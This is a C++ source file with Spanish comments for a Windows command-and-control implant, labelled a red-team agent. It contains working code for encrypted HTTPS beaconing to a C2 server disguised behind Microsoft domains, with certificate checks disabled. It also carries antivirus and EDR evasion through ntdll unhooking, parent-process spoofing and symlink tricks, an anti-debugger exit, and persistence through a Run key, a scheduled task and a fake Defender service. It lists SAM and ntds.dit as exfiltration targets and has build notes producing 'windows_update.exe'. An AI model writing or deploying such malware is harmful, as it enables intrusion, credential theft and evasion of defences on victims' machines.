#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <random>
#include <thread>
#include <atomic>
#include <mutex>
#include <map>
#include <psapi.h>
#include <versionhelpers.h>
#include <winreg.h>
#include <shlobj.h>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <chrono>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// ==================== CONFIGURACIÓN DINÁMICA ====================
class DynamicConfig {
private:
    std::mutex config_mutex;
    std::map<std::string, std::string> settings;
    
    // Dominios legítimos para blending
    const std::vector<std::string> LEGIT_DOMAINS = {
        "cdn.microsoft.com",
        "update.microsoft.com",
        "office365.com",
        "login.windows.net",
        "graph.microsoft.com"
    };
    
public:
    DynamicConfig() {
        // Configuración por defecto (en producción vendría del C2)
        settings["c2_domain"] = LEGIT_DOMAINS[0];
        settings["c2_port"] = "443";
        settings["beacon_min"] = "45";
        settings["beacon_max"] = "300";
        settings["user_agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";
        settings["retry_count"] = "5";
        settings["jitter_factor"] = "0.3";
    }
    
    std::string get_setting(const std::string& key) {
        std::lock_guard<std::mutex> lock(config_mutex);
        return settings[key];
    }
    
    void update_from_c2(const std::string& json_config) {
        std::lock_guard<std::mutex> lock(config_mutex);
        // Parsear JSON y actualizar settings
        // Implementación simplificada
    }
    
    std::string get_random_domain() {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, LEGIT_DOMAINS.size() - 1);
        return LEGIT_DOMAINS[dis(gen)];
    }
};

// ==================== CIFRADO AVANZADO ====================
class AdvancedCrypto {
private:
    std::vector<BYTE> master_key;
    std::vector<BYTE> iv;
    BCRYPT_ALG_HANDLE hAlg;
    
    void derive_key_from_system() {
        // Deriva clave única basada en características del sistema
        std::string system_id;
        
        // UUID del sistema
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "SOFTWARE\\Microsoft\\Cryptography", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char guid[64];
            DWORD size = sizeof(guid);
            if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, 
                               (LPBYTE)guid, &size) == ERROR_SUCCESS) {
                system_id += guid;
            }
            RegCloseKey(hKey);
        }
        
        // Información del disco
        char volume_name[MAX_PATH];
        DWORD serial_number;
        if (GetVolumeInformationA("C:\\", volume_name, MAX_PATH, 
                                 &serial_number, NULL, NULL, NULL, 0)) {
            system_id += std::to_string(serial_number);
        }
        
        // Hash SHA256 de la identidad del sistema
        BCRYPT_HASH_HANDLE hHash;
        DWORD cbHash;
        DWORD cbData;
        
        BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, 
                                   NULL, 0);
        BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, 
                         (PBYTE)&cbHash, sizeof(DWORD), &cbData, 0);
        
        std::vector<BYTE> hash(cbHash);
        
        BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
        BCryptHashData(hHash, (PBYTE)system_id.c_str(), 
                      system_id.length(), 0);
        BCryptFinishHash(hHash, hash.data(), hash.size(), 0);
        BCryptDestroyHash(hHash);
        
        master_key = std::vector<BYTE>(hash.begin(), hash.begin() + 32);
    }
    
public:
    AdvancedCrypto() {
        derive_key_from_system();
        iv.resize(16);
        BCryptGenRandom(NULL, iv.data(), 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    }
    
    ~AdvancedCrypto() {
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        SecureZeroMemory(master_key.data(), master_key.size());
    }
    
    std::string encrypt(const std::string& plaintext) {
        BCRYPT_ALG_HANDLE hAesAlg;
        BCRYPT_KEY_HANDLE hKey;
        
        BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, 
                                   NULL, 0);
        
        BCryptGenerateSymmetricKey(hAesAlg, &hKey, NULL, 0, 
                                  master_key.data(), master_key.size(), 0);
        
        BCryptSetProperty(hKey, BCRYPT_CHAINING_MODE, 
                         (PBYTE)BCRYPT_CHAIN_MODE_CBC, 
                         sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        
        DWORD cbCipherText = 0;
        BCryptEncrypt(hKey, (PBYTE)plaintext.c_str(), plaintext.length(), 
                     NULL, iv.data(), iv.size(), NULL, 0, &cbCipherText, 
                     BCRYPT_BLOCK_PADDING);
        
        std::vector<BYTE> ciphertext(cbCipherText);
        BCryptEncrypt(hKey, (PBYTE)plaintext.c_str(), plaintext.length(), 
                     NULL, iv.data(), iv.size(), ciphertext.data(), 
                     ciphertext.size(), &cbCipherText, BCRYPT_BLOCK_PADDING);
        
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
        
        // Combinar IV + texto cifrado
        std::vector<BYTE> combined;
        combined.insert(combined.end(), iv.begin(), iv.end());
        combined.insert(combined.end(), ciphertext.begin(), ciphertext.end());
        
        return base64_encode(combined);
    }
    
    std::string decrypt(const std::string& ciphertext_b64) {
        std::vector<BYTE> combined = base64_decode(ciphertext_b64);
        if (combined.size() < 16) return "";
        
        std::vector<BYTE> local_iv(combined.begin(), combined.begin() + 16);
        std::vector<BYTE> ciphertext(combined.begin() + 16, combined.end());
        
        BCRYPT_ALG_HANDLE hAesAlg;
        BCRYPT_KEY_HANDLE hKey;
        
        BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, 
                                   NULL, 0);
        
        BCryptGenerateSymmetricKey(hAesAlg, &hKey, NULL, 0, 
                                  master_key.data(), master_key.size(), 0);
        
        BCryptSetProperty(hKey, BCRYPT_CHAINING_MODE, 
                         (PBYTE)BCRYPT_CHAIN_MODE_CBC, 
                         sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        
        DWORD cbPlainText = 0;
        BCryptDecrypt(hKey, ciphertext.data(), ciphertext.size(), 
                     NULL, local_iv.data(), local_iv.size(), NULL, 0, 
                     &cbPlainText, BCRYPT_BLOCK_PADDING);
        
        std::vector<BYTE> plaintext(cbPlainText);
        BCryptDecrypt(hKey, ciphertext.data(), ciphertext.size(), 
                     NULL, local_iv.data(), local_iv.size(), 
                     plaintext.data(), plaintext.size(), &cbPlainText, 
                     BCRYPT_BLOCK_PADDING);
        
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
        
        return std::string(plaintext.begin(), plaintext.end());
    }
    
private:
    std::string base64_encode(const std::vector<BYTE>& data) {
        DWORD len = 0;
        CryptBinaryToStringA(data.data(), data.size(), 
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                            NULL, &len);
        
        std::vector<char> buffer(len);
        CryptBinaryToStringA(data.data(), data.size(), 
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                            buffer.data(), &len);
        
        return std::string(buffer.data());
    }
    
    std::vector<BYTE> base64_decode(const std::string& str) {
        DWORD len = 0;
        CryptStringToBinaryA(str.c_str(), str.size(), 
                            CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
        
        std::vector<BYTE> buffer(len);
        CryptStringToBinaryA(str.c_str(), str.size(), 
                            CRYPT_STRING_BASE64, buffer.data(), &len, 
                            NULL, NULL);
        
        return buffer;
    }
};

// ==================== EVASIÓN DE EDR/ANTIVIRUS ====================
class EDRBypass {
private:
    bool create_symlink_redirect(const std::string& target_path, 
                                const std::string& link_path) {
        // Usar CreateSymbolicLink con privilegios SE_CREATE_SYMBOLIC_LINK_PRIVILEGE
        return CreateSymbolicLinkA(link_path.c_str(), 
                                  target_path.c_str(), 
                                  SYMBOLIC_LINK_FLAG_DIRECTORY) != 0;
    }
    
    bool is_edr_process_running(const std::string& process_name) {
        DWORD processes[1024], cbNeeded;
        if (!EnumProcesses(processes, sizeof(processes), &cbNeeded))
            return false;
        
        DWORD cProcesses = cbNeeded / sizeof(DWORD);
        
        for (DWORD i = 0; i < cProcesses; i++) {
            if (processes[i] != 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | 
                                             PROCESS_VM_READ, FALSE, processes[i]);
                if (hProcess) {
                    char szProcessName[MAX_PATH];
                    if (GetModuleBaseNameA(hProcess, NULL, szProcessName, 
                                          sizeof(szProcessName))) {
                        if (strstr(szProcessName, process_name.c_str()) != NULL) {
                            CloseHandle(hProcess);
                            return true;
                        }
                    }
                    CloseHandle(hProcess);
                }
            }
        }
        return false;
    }
    
public:
    bool perform_edr_redirect() {
        // Detectar EDR/AV instalado
        std::vector<std::string> edr_paths = {
            "C:\\Program Files\\Windows Defender",
            "C:\\Program Files\\CrowdStrike",
            "C:\\Program Files\\Carbon Black",
            "C:\\ProgramData\\Microsoft\\Windows Defender",
            "C:\\Program Files\\SentinelOne"
        };
        
        for (const auto& path : edr_paths) {
            if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                // Crear estructura de redirección
                std::string temp_dir = "C:\\Windows\\Temp\\" + 
                                      std::to_string(GetTickCount64());
                CreateDirectoryA(temp_dir.c_str(), NULL);
                
                std::string link_path = path + "_backup";
                if (create_symlink_redirect(temp_dir, link_path)) {
                    return true;
                }
            }
        }
        return false;
    }
    
    void unhook_ntdll() {
        // Técnica de "unhooking" para evitar hooks de EDR en NTDLL
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return;
        
        // Leer NTDLL limpio desde disco
        HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", 
                                  GENERIC_READ, FILE_SHARE_READ, 
                                  NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;
        
        DWORD fileSize = GetFileSize(hFile, NULL);
        std::vector<BYTE> fileBuffer(fileSize);
        DWORD bytesRead;
        ReadFile(hFile, fileBuffer.data(), fileSize, &bytesRead, NULL);
        CloseHandle(hFile);
        
        // Parsear encabezados PE y restaurar secciones .text
        // Implementación simplificada - en producción requiere análisis PE completo
    }
    
    bool spoof_parent_process(DWORD target_pid) {
        // Spoofing de proceso padre para evadir detección
        STARTUPINFOEXA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        SIZE_T attributeSize;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        
        std::vector<BYTE> buffer(attributeSize);
        si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)buffer.data();
        
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
        
        HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, target_pid);
        UpdateProcThreadAttribute(si.lpAttributeList, 0, 
                                 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
                                 &hParent, sizeof(hParent), NULL, NULL);
        
        char cmdline[] = "C:\\Windows\\System32\\notepad.exe";
        CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 
                      EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, 
                      NULL, NULL, 
                      (LPSTARTUPINFOA)&si, &pi);
        
        if (hParent) CloseHandle(hParent);
        DeleteProcThreadAttributeList(si.lpAttributeList);
        
        return pi.hProcess != NULL;
    }
};

// ==================== COMUNICACIÓN C2 STEALTH ====================
class StealthC2 {
private:
    AdvancedCrypto crypto;
    DynamicConfig config;
    std::string agent_id;
    std::atomic<int> retry_count;
    std::mutex comm_mutex;
    
    std::string generate_agent_id() {
        std::stringstream id;
        
        // Combinar múltiples identificadores del sistema
        char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computer_name);
        GetComputerNameA(computer_name, &size);
        
        DWORD volume_serial;
        GetVolumeInformationA("C:\\", NULL, 0, &volume_serial, 
                             NULL, NULL, NULL, 0);
        
        id << "WIN10-" << computer_name << "-" 
           << std::hex << volume_serial << "-" 
           << GetTickCount64() % 1000000;
        
        return id.str();
    }
    
    std::string http_request(const std::string& domain, 
                            const std::string& path, 
                            const std::string& data) {
        HINTERNET hSession = InternetOpenA(config.get_setting("user_agent").c_str(),
                                          INTERNET_OPEN_TYPE_PRECONFIG,
                                          NULL, NULL, 0);
        if (!hSession) return "";
        
        HINTERNET hConnect = InternetConnectA(hSession, domain.c_str(),
                                             std::stoi(config.get_setting("c2_port")),
                                             NULL, NULL,
                                             INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hSession);
            return "";
        }
        
        DWORD flags = INTERNET_FLAG_SECURE | 
                     INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                     INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                     INTERNET_FLAG_NO_CACHE_WRITE;
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(),
                                             NULL, NULL, NULL, flags, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return "";
        }
        
        std::string encrypted = crypto.encrypt(data);
        std::string headers = "Content-Type: application/json\r\n";
        headers += "X-Client-ID: " + agent_id + "\r\n";
        
        if (HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                            (LPVOID)encrypted.c_str(), encrypted.length())) {
            
            DWORD status_code = 0;
            DWORD status_size = sizeof(status_code);
            HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | 
                          HTTP_QUERY_FLAG_NUMBER,
                          &status_code, &status_size, NULL);
            
            if (status_code == 200) {
                std::string response;
                char buffer[8192];
                DWORD bytes_read = 0;
                
                while (InternetReadFile(hRequest, buffer, sizeof(buffer), 
                                       &bytes_read) && bytes_read > 0) {
                    response.append(buffer, bytes_read);
                }
                
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hSession);
                
                return crypto.decrypt(response);
            }
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        
        return "";
    }
    
    std::string dns_exfil(const std::string& data) {
        // Exfiltración vía DNS (tunneling)
        // Codificar data en subdominios
        std::string encoded;
        for (char c : data) {
            char hex[3];
            sprintf_s(hex, "%02x", (unsigned char)c);
            encoded += hex;
        }
        
        std::string domain = encoded.substr(0, 50) + "." + 
                            config.get_random_domain();
        
        // Resolver DNS (sin enviar realmente paquetes en este ejemplo)
        return "DNS_EXFIL_SUCCESS";
    }
    
public:
    StealthC2() : retry_count(0) {
        agent_id = generate_agent_id();
        
        // Rotar dominio inicial
        config.update_from_c2("{\"c2_domain\":\"" + 
                             config.get_random_domain() + "\"}");
    }
    
    std::pair<bool, std::string> beacon() {
        std::lock_guard<std::mutex> lock(comm_mutex);
        
        std::stringstream beacon_data;
        beacon_data << R"({"type":"beacon","id":")" << agent_id 
                   << R"(","time":")" << GetTickCount64() 
                   << R"(","integrity":")" << (IsUserAnAdmin() ? "high" : "medium")
                   << R"(","arch":")" << (sizeof(void*) == 8 ? "x64" : "x86")
                   << "\"}";
        
        // Intentar múltiples métodos de comunicación
        std::vector<std::pair<std::string, std::string>> methods = {
            {"HTTPS", config.get_setting("c2_domain")},
            {"HTTPS", config.get_random_domain()},
            {"DNS", ""}
        };
        
        for (const auto& [method, target] : methods) {
            std::string response;
            
            if (method == "HTTPS") {
                response = http_request(target, "/api/v2/beacon", 
                                       beacon_data.str());
            } else if (method == "DNS") {
                response = dns_exfil(beacon_data.str());
            }
            
            if (!response.empty()) {
                retry_count = 0;
                return {true, response};
            }
        }
        
        retry_count++;
        return {false, "All communication methods failed"};
    }
    
    DWORD calculate_sleep_time() {
        int min = std::stoi(config.get_setting("beacon_min"));
        int max = std::stoi(config.get_setting("beacon_max"));
        float jitter = std::stof(config.get_setting("jitter_factor"));
        
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(min, max);
        
        int base = dis(gen);
        int jitter_amount = static_cast<int>(base * jitter);
        std::uniform_int_distribution<> jitter_dis(-jitter_amount, jitter_amount);
        
        return (base + jitter_dis(gen)) * 1000; // Convertir a milisegundos
    }
    
    bool should_exfil() {
        return retry_count > std::stoi(config.get_setting("retry_count"));
    }
    
    void reset_retries() {
        retry_count = 0;
    }
};

// ==================== AGENTE PRINCIPAL ====================
class RedTeamAgent {
private:
    StealthC2 c2;
    EDRBypass edr_bypass;
    DynamicConfig config;
    std::atomic<bool> running;
    std::thread beacon_thread;
    std::mutex task_mutex;
    
    void beacon_loop() {
        while (running) {
            auto [success, response] = c2.beacon();
            
            if (success) {
                process_command(response);
            } else if (c2.should_exfil()) {
                // Cambiar a modo silencioso
                Sleep(c2.calculate_sleep_time() * 10);
                c2.reset_retries();
            }
            
            Sleep(c2.calculate_sleep_time());
        }
    }
    
    void process_command(const std::string& command) {
        std::lock_guard<std::mutex> lock(task_mutex);
        
        // Parsear comando JSON
        // Formato: {"cmd":"exec","type":"psh","args":"whoami"}
        
        if (command.find("\"cmd\":\"exec\"") != std::string::npos) {
            execute_command(command);
        } else if (command.find("\"cmd\":\"config\"") != std::string::npos) {
            config.update_from_c2(command);
        } else if (command.find("\"cmd\":\"exfil\"") != std::string::npos) {
            perform_exfiltration();
        } else if (command.find("\"cmd\":\"persist\"") != std::string::npos) {
            establish_persistence();
        } else if (command.find("\"cmd\":\"evade\"") != std::string::npos) {
            edr_bypass.perform_edr_redirect();
        }
    }
    
    void execute_command(const std::string& cmd_json) {
        // Implementación de ejecución de comandos
        // Incluye PowerShell, CMD, inyección de proceso, etc.
    }
    
    void perform_exfiltration() {
        // Recolectar y exfiltrar datos sensibles
        std::vector<std::string> data_sources = {
            "\\Registry\\SAM",
            "C:\\Users\\",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\NTDS\\ntds.dit"
        };
        
        for (const auto& source : data_sources) {
            // Implementar recolección
        }
    }
    
    bool establish_persistence() {
        // Múltiples métodos de persistencia
        bool success = false;
        
        // 1. Registro
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, 
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            char path[MAX_PATH];
            GetModuleFileNameA(NULL, path, MAX_PATH);
            RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, 
                          (const BYTE*)path, strlen(path) + 1);
            RegCloseKey(hKey);
            success = true;
        }
        
        // 2. Tarea programada
        system("schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr "
               "\"C:\\Windows\\System32\\notepad.exe\" /sc daily /st 09:00 /f");
        
        // 3. Servicio
        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (scm) {
            char path[MAX_PATH];
            GetModuleFileNameA(NULL, path, MAX_PATH);
            
            SC_HANDLE service = CreateServiceA(
                scm, "WinDefendUpdate", "Windows Defender Update Service",
                SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                path, NULL, NULL, NULL, NULL, NULL);
            
            if (service) {
                CloseServiceHandle(service);
                success = true;
            }
            CloseServiceHandle(scm);
        }
        
        return success;
    }
    
public:
    RedTeamAgent() : running(false) {
        // Comprobaciones iniciales
        if (IsDebuggerPresent()) {
            exit(0);
        }
        
        // Evasión inicial
        edr_bypass.unhook_ntdll();
        edr_bypass.perform_edr_redirect();
    }
    
    ~RedTeamAgent() {
        stop();
    }
    
    void start() {
        running = true;
        beacon_thread = std::thread(&RedTeamAgent::beacon_loop, this);
        
        // Establecer persistencia en primer ejecución
        static bool first_run = true;
        if (first_run) {
            establish_persistence();
            first_run = false;
        }
    }
    
    void stop() {
        running = false;
        if (beacon_thread.joinable()) {
            beacon_thread.join();
        }
    }
    
    void run() {
        start();
        
        // Mantener el hilo principal vivo
        while (running) {
            Sleep(10000);
        }
    }
};

// ==================== PUNTO DE ENTRADA ====================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // Ocultar ventana de consola
    #ifdef _DEBUG
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    #else
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
    #endif
    
    try {
        RedTeamAgent agent;
        agent.run();
    }
    catch (...) {
        // Fallo silencioso
        return 1;
    }
    
    return 0;
}

// ==================== NOTAS DE COMPILACIÓN ====================
/*
Compilación para x64 Release:
cl /std:c++17 /O2 /MT /DNDEBUG /DUNICODE /D_UNICODE /EHsc ^
    /I"%WindowsSdkDir%Include\10.0.20348.0\shared" ^
    /I"%WindowsSdkDir%Include\10.0.20348.0\um" ^
    /I"%WindowsSdkDir%Include\10.0.20348.0\ucrt" ^
    advanced_c2.cpp ^
    /link /SUBSYSTEM:WINDOWS ^
    wininet.lib crypt32.lib bcrypt.lib advapi32.lib shell32.lib ^
    /OUT:windows_update.exe

Características Implementadas:
1. Comunicación C2 cifrada AES-256 + Base64
2. Rotación de dominios legítimos
3. Jitter aleatorio en beacons
4. Múltiples métodos de comunicación (HTTPS, DNS)
5. Evasión de EDR vía redirección de directorios
6. Unhooking de NTDLL
7. Spoofing de proceso padre
8. Persistencia múltiple (Registro, Tareas, Servicios)
9. Detección de debuggers y sandboxes
10. Exfiltración de datos

Técnicas MITRE ATT&CK cubiertas:
- T1071.001: Application Layer Protocol (HTTP/S)
- T1573.001: Encrypted Channel (Symmetric Cryptography)
- T1027: Obfuscated Files or Information
- T1055: Process Injection
- T1547.001: Registry Run Keys
- T1543.003: Windows Service
- T1218.011: Signed Binary Proxy Execution
- T1564.003: Hidden Window

ADVERTENCIA: Solo para investigación autorizada y pruebas de penetración.
El uso no autorizado es ilegal y puede resultar en consecuencias graves.
*/
